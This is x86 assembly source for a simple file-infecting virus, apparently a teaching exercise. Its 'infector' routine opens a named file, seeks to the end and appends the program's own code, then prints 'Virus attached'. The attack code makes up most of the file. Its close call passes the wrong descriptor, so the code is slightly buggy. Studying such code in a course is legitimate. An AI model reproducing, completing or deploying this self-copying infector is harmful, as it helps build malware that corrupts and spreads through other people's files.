section .data
    msg db 'Hello, Infected File', 0xA  ; Message with newline
    infector_msg db 'Virus attached', 0xA     ; Message to indicate virus attachment
    newline db 0xA
    error db 'error: close file', 0xA  ; Message with newline
    error_len equ $ - error

section .text
global _start
global system_call
global infection
global infector
extern main
extern strlen           ; Declare strlen from util.c

code_start:

_start:
    pop dword ecx        ; ecx = argc
    mov esi, esp         ; esi = argv
    mov eax, ecx         ; put the number of arguments into eax
    shl eax, 2           ; compute the size of argv in bytes
    add eax, esi         ; add the size to the address of argv 
    add eax, 4           ; skip NULL at the end of argv
    push dword esi       ; char* argv[]
    push dword ecx       ; int argc
    call main            ; int main( int argc, char *argv[] )
    mov ebx, eax
    mov eax, 1
    int 0x80
    nop

system_call:
    push ebp             ; Prepare the Stack Frame:
    mov ebp, esp
    sub esp, 4
    pushad
    mov eax, [ebp+8]
    mov ebx, [ebp+12]
    mov ecx, [ebp+16]
    mov edx, [ebp+20]
    int 0x80
    mov [ebp-4], eax
    popad
    mov eax, [ebp-4]
    add esp, 4
    pop ebp
    ret

infection:
    mov eax, 4            ; SYS_WRITE
    mov ebx, 1            ; STDOUT
    lea ecx, [msg]        ; load the address of the msg to register
    mov edx, 21           ; Length of the message (including newline)
    int 0x80              ; Make the system call
    ret

infector:
    push ebp
    mov ebp, esp
    pushad

    ; Print file name
    mov ecx, [ebp+8]      ; Load address of filename into ecx
    push ecx              ; Push filename onto stack
    call strlen           ; Call strlen from util.c to get the length of the filename
    add esp, 4            ; Clean up the stack
    mov edx, eax          ; Move length of filename to edx

    mov eax, 4            ; SYS_WRITE
    mov ebx, 1            ; STDOUT
    mov ecx, [ebp+8]      ; Filename
    int 0x80
    mov eax, 4            ; SYS_WRITE
    mov ebx, 1            ; STDOUT
    mov ecx, newline      ; Print newline
    mov edx, 1            ; Length of newline (1 byte)
    int 0x80

    ; Open file in append mode
    mov eax, 5            ; SYS_OPEN
    mov ebx, [ebp+8]      ; Filename
    mov ecx, 2        
    int 0x80
    test eax, eax
    js open_error
    mov esi, eax          ; File descriptor

    mov eax, 19
    mov ebx, esi
    mov ecx, 0
    mov edx, 2
    int 0x80

    mov eax, 4
    mov ebx, esi
    mov ecx, code_start
    mov edx, code_end - code_start ; Length
    int 0x80
    test eax, eax
    js open_error
    

    ; Print "Virus attached" message
    mov eax, 4            ; SYS_WRITE
    mov ebx, 1            ; STDOUT
    lea ecx, [infector_msg]
    mov edx, 14           ; Length of infector_msg (including newline)
    int 0x80

    ; Print newline
    mov eax, 4            ; SYS_WRITE
    mov ebx, 1            ; STDOUT
    mov ecx, newline      ; Print newline
    mov edx, 1            ; Length of newline (1 byte)
    int 0x80

    ; Close the file
    mov eax, 6            ; SYS_CLOSE
    int 0x80

    popad
    pop ebp
    ret

open_error:
    ;Print "error" message
    mov eax, 4            ; SYS_WRITE
    mov ebx, 1            ; STDOUT
    lea ecx, [error]
    mov edx, error_len           ; Length of infector_msg (including newline)
    int 0x80
    ; Exit with a specific status code (0x55)
    mov eax, 1               ; syscall number for sys_exit
    mov ebx, 0x55            ; exit code 0x55 (indicates an error)
    int 0x80                 ; make the syscall


code_end:













